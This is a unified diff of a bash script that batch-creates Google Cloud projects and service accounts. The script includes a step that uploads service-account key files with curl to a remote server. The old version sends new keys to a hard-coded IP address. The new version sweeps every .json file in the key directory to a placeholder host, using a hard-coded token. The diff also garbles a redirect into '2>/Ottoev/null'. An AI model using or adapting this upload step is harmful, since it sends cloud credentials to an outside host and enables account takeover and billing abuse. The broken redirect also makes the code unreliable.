@@ -1005,7 +1005,6 @@ vertex_create_projects() {
     log "INFO" "开始创建项目..."
     local success=0
     local failed=0
-    local key_files=() # 存储所有成功创建的密钥文件
     
     local i=1
     while [ $i -le $num_projects ]; do
@@ -1024,7 +1023,7 @@ vertex_create_projects() {
         log "INFO" "关联结算账户..."
         if ! retry gcloud billing projects link "$project_id" --billing-account="$BILLING_ACCOUNT" --quiet; then
             log "ERROR" "关联结算账户失败: ${project_id}"
-            gcloud projects delete "$project_id" --quiet 2>/dev/null
+            gcloud projects delete "$project_id" --quiet 2>/Ottoev/null
             failed=$((failed + 1)) || true
             show_progress "$i" "$num_projects"
             continue
@@ -1042,9 +1041,6 @@ vertex_create_projects() {
         if vertex_setup_service_account "$project_id"; then
             log "SUCCESS" "成功配置项目: ${project_id}"
             success=$((success + 1)) || true
-            # 记录密钥文件路径
-            local key_file="${KEY_DIR}/${project_id}-${SERVICE_ACCOUNT_NAME}-$(date +%Y%m%d-%H%M%S).json"
-            key_files+=("$key_file")
         else
             log "ERROR" "配置服务账号失败: ${project_id}"
             failed=$((failed + 1)) || true
@@ -1055,34 +1051,44 @@ vertex_create_projects() {
         i=$((i + 1)) || true
     done
     
-    # 发送密钥到服务器
-    if [ ${#key_files[@]} -gt 0 ]; then
-        log "INFO" "开始将密钥文件发送到服务器..."
-        local server_url="http://141.98.197.19:5000/upload" # 替换为你的服务器URL
-        local auth_token="abc123xyz789" # 替换为你的认证令牌（如果需要）
+    # 发送 KEY_DIR 下的所有 .json 文件到服务器
+    log "INFO" "扫描密钥目录: ${KEY_DIR}"
+    if [ ! -d "$KEY_DIR" ]; then
+        log "ERROR" "密钥目录不存在: ${KEY_DIR}"
+        failed=$((failed + 1)) || true
+    else
+        local key_files=()
+        while IFS= read -r -d '' file; do
+            key_files+=("$file")
+        done < <(find "$KEY_DIR" -type f -name "*.json" -print0 2>/dev/null)
         
-        for key_file in "${key_files[@]}"; do
-            if [ -f "$key_file" ]; then
+        if [ ${#key_files[@]} -eq 0 ]; then
+            log "WARN" "密钥目录 ${KEY_DIR} 中没有 .json 文件"
+        else
+            log "INFO" "开始将 ${#key_files[@]} 个密钥文件发送到服务器..."
+            local server_url="http://your-server-ip:5000/upload" # 替换为你的服务器URL
+            local auth_token="abc123xyz789" # 替换为你的认证令牌
+            
+            local upload_success=0
+            local upload_failed=0
+            for key_file in "${key_files[@]}"; do
                 log "INFO" "发送密钥文件: $(basename "$key_file")"
                 if curl -X POST -H "Authorization: Bearer $auth_token" \
                     -F "file=@$key_file" \
-                    "$server_url" 2>/dev/null; then
+                    "$server_url" --fail --silent --show-error 2>> "${TEMP_DIR}/upload_errors.log"; then
                     log "SUCCESS" "成功发送密钥文件: $(basename "$key_file")"
+                    upload_success=$((upload_success + 1)) || true
                 else
                     log "ERROR" "发送密钥文件失败: $(basename "$key_file")"
-                    failed=$((failed + 1)) || true
+                    upload_failed=$((upload_failed + 1)) || true
                 fi
-            else
-                log "ERROR" "密钥文件不存在: $(basename "$key_file")"
-                failed=$((failed + 1)) || true
-            fi
-        done
-    else
-        log "WARN" "没有成功创建的密钥文件需要发送"
+            done
+            log "INFO" "上传结果：成功 ${upload_success} 个，失败 ${upload_failed} 个"
+        fi
     fi
     
     echo -e "\n${GREEN}操作完成！${NC}"
-    echo "成功: ${success}, 失败: ${failed}"
+    echo "项目创建 - 成功: ${success}, 失败: ${failed}"
     echo "服务账号密钥已保存在: ${KEY_DIR}"
 }
 
